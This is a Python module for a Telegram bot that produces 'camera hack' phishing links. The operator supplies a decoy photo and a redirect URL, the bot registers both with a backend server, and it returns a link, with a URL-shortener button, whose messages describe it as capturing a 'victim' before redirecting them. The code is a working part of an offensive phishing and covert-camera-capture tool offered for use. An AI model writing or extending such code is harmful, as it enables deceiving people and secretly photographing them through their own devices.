import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import uuid
import requests
from config import BASE_URL, BOT_TOKEN

user_data = {}

def generate_link(user_id):
    unique_id = str(uuid.uuid4())[:8]
    return f"{BASE_URL}/p/{unique_id}?type=cam&v={user_id}"

def get_bottom_buttons():
    from bot import get_bottom_buttons
    return get_bottom_buttons()

def handle_cam_hack(bot, message):
    user_id = message.chat.id
    msg = bot.send_message(
        user_id,
        "📤 Send me a PHOTO (will be shown to victim)",
        reply_markup=get_bottom_buttons()
    )
    bot.register_next_step_handler(msg, get_photo, user_id)

def get_photo(message, user_id):
    if message.photo:
        photo_id = message.photo[-1].file_id
        file_info = bot.get_file(photo_id)
        photo_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
        user_data[user_id] = {"photo_url": photo_url}
        try:
            requests.post(f"{BASE_URL}/store_photo/{user_id}", json={"photo_url": photo_url}, timeout=5)
        except:
            pass
        bot.send_message(
            user_id,
            "📤 Now send REDIRECT LINK (URL where victim goes after capture)",
            reply_markup=get_bottom_buttons()
        )
        bot.register_next_step_handler(message, get_redirect, user_id)
    else:
        bot.send_message(user_id, "❌ Send a PHOTO first.", reply_markup=get_bottom_buttons())

def get_redirect(message, user_id):
    redirect_url = message.text
    if redirect_url.startswith("http"):
        user_data[user_id]["redirect"] = redirect_url
        try:
            requests.post(f"{BASE_URL}/set_redirect/{user_id}", json={"url": redirect_url}, timeout=5)
        except:
            pass
        link = generate_link(user_id)
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🔗 Open Link", url=link),
            InlineKeyboardButton("📋 Copy Link", callback_data="copy"),
            InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/")
        )
        bot.send_message(
            user_id,
            f"✅ *CAMERA phishing link ready:*\n\n`{link}`\n\nVictim sees your photo → redirects to `{redirect_url}`",
            reply_markup=markup,
            parse_mode="Markdown"
        )
    else:
        bot.send_message(user_id, "❌ Valid URL starting with http:// or https://", reply_markup=get_bottom_buttons())
        bot.register_next_step_handler(message, get_redirect, user_id)
